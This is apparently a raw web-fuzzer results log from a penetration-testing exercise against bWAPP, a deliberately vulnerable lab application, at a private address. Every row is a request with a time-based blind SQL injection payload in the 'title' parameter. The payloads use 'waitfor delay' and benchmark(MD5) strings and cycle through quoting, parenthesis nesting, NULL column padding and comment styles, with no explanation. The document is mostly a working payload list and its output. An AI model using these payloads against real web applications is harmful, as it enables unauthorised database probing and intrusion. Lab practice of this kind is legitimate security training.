211,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='))%20waitfor%20delay%20'0:0:20'%20--
210,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='))%20waitfor%20delay%20'0:0:20'%20/*
214,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=')))%20waitfor%20delay%20'0:0:20'%20/*
217,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")))%20waitfor%20delay%20'0:0:20'%20--"
215,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=')))%20waitfor%20delay%20'0:0:20'%20--
219,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='))))%20waitfor%20delay%20'0:0:20'%20--
216,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")))%20waitfor%20delay%20'0:0:20'%20/*"
220,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))))%20waitfor%20delay%20'0:0:20'%20/*"
218,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='))))%20waitfor%20delay%20'0:0:20'%20/*
221,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))))%20waitfor%20delay%20'0:0:20'%20--"
224,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")))))%20waitfor%20delay%20'0:0:20'%20/*"
223,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=')))))%20waitfor%20delay%20'0:0:20'%20--
222,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=')))))%20waitfor%20delay%20'0:0:20'%20/*
231,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*"
227,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='))))))%20waitfor%20delay%20'0:0:20'%20--
230,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
229,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))))))%20waitfor%20delay%20'0:0:20'%20--"
225,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")))))%20waitfor%20delay%20'0:0:20'%20--"
228,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))))))%20waitfor%20delay%20'0:0:20'%20/*"
232,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--"
226,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='))))))%20waitfor%20delay%20'0:0:20'%20/*
233,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23"
234,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*"
235,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--"
240,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*"
236,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23"
239,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23"
238,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--"
237,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*"
243,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*"
241,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--"
242,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23"
244,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--"
245,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23"
252,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*"
253,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--"
247,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--"
246,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*"
248,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23"
249,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*"
255,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*"
250,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--"
254,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23"
251,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23"
256,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--"
258,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*"
257,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23"
259,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--"
260,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23"
265,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--"
263,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23"
267,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*"
266,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23"
261,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*"
262,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--"
264,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*"
269,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23"
271,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--"
270,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*"
272,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23"
273,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*"
268,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--"
275,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23"
277,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--"
279,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*"
278,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23"
274,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--"
276,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*"
280,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--"
281,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23"
282,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*"
285,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*"
283,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--"
284,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23"
287,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23"
286,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--"
288,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*"
289,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--"
291,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*"
290,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23"
292,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--"
294,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*"
293,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23"
298,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--"
295,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--"
297,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*"
299,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23"
296,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23"
300,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*"
301,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--"
303,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*"
302,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23"
306,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*"
304,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--"
309,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*"
308,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23"
305,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23"
307,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--"
311,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23"
310,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--"
313,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--"
315,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*"
314,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23"
312,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*"
318,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*"
321,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
319,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--"
317,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23"
320,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23"
323,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--"
316,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--"
322,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*"
324,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23"
325,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*"
326,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--"
332,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--"
328,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*"
330,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23"
329,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--"
331,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*"
327,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23"
333,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23"
334,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*"
335,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--"
337,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*"
336,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23"
338,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--"
339,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23"
340,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
341,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=and%200=benchmark(3000000,MD5(1))%20/*"
343,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=and%200=benchmark(3000000,MD5(1))%20%23"
342,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=and%200=benchmark(3000000,MD5(1))%20--"
344,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20and%200=benchmark(3000000,MD5(1))%20/*"
347,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""%20and%200=benchmark(3000000,MD5(1))%20/*"
345,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20and%200=benchmark(3000000,MD5(1))%20--"
346,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20and%200=benchmark(3000000,MD5(1))%20%23"
349,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""%20and%200=benchmark(3000000,MD5(1))%20%23"
350,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=)%20and%200=benchmark(3000000,MD5(1))%20/*"
348,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""%20and%200=benchmark(3000000,MD5(1))%20--"
351,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=)%20and%200=benchmark(3000000,MD5(1))%20--"
352,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=)%20and%200=benchmark(3000000,MD5(1))%20%23"
353,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=))%20and%200=benchmark(3000000,MD5(1))%20/*"
355,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=))%20and%200=benchmark(3000000,MD5(1))%20%23"
354,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=))%20and%200=benchmark(3000000,MD5(1))%20--"
358,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=)))%20and%200=benchmark(3000000,MD5(1))%20%23"
357,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=)))%20and%200=benchmark(3000000,MD5(1))%20--"
359,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=))))%20and%200=benchmark(3000000,MD5(1))%20/*"
356,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=)))%20and%200=benchmark(3000000,MD5(1))%20/*"
361,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=))))%20and%200=benchmark(3000000,MD5(1))%20%23"
360,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=))))%20and%200=benchmark(3000000,MD5(1))%20--"
362,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=')%20and%200=benchmark(3000000,MD5(1))%20/*"
364,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=')%20and%200=benchmark(3000000,MD5(1))%20%23"
363,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=')%20and%200=benchmark(3000000,MD5(1))%20--"
365,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")%20and%200=benchmark(3000000,MD5(1))%20/*"
368,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='))%20and%200=benchmark(3000000,MD5(1))%20/*"
367,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")%20and%200=benchmark(3000000,MD5(1))%20%23"
366,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")%20and%200=benchmark(3000000,MD5(1))%20--"
371,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))%20and%200=benchmark(3000000,MD5(1))%20/*"
369,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='))%20and%200=benchmark(3000000,MD5(1))%20--"
374,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=')))%20and%200=benchmark(3000000,MD5(1))%20/*"
372,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))%20and%200=benchmark(3000000,MD5(1))%20--"
373,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))%20and%200=benchmark(3000000,MD5(1))%20%23"
370,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='))%20and%200=benchmark(3000000,MD5(1))%20%23"
378,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")))%20and%200=benchmark(3000000,MD5(1))%20--"
377,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")))%20and%200=benchmark(3000000,MD5(1))%20/*"
375,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=')))%20and%200=benchmark(3000000,MD5(1))%20--"
376,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=')))%20and%200=benchmark(3000000,MD5(1))%20%23"
381,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='))))%20and%200=benchmark(3000000,MD5(1))%20--"
379,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title="")))%20and%200=benchmark(3000000,MD5(1))%20%23"
380,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='))))%20and%200=benchmark(3000000,MD5(1))%20/*"
383,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))))%20and%200=benchmark(3000000,MD5(1))%20/*"
382,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='))))%20and%200=benchmark(3000000,MD5(1))%20%23"
384,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))))%20and%200=benchmark(3000000,MD5(1))%20--"
385,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=""))))%20and%200=benchmark(3000000,MD5(1))%20%23"
